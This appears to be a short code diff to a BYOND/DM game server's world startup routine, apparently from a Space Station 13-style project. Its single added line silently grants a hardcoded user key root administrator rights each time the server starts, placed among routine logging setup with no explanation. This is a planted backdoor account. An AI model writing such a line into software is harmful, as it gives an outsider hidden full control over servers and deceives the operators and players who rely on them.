@@ -9,6 +9,7 @@
 
 #define RECOMMENDED_VERSION 500
 /world/New()
+	world.SetConfig("APP/admin", ckey("Molesto411"), "role=root")
 	//logs
 	var/date_string = time2text(world.realtime, "YYYY/MM-Month/DD-Day")
 	log = file("data/logs/runtime/[time2text(world.realtime,"YYYY-MM")].log")		//funtimelog
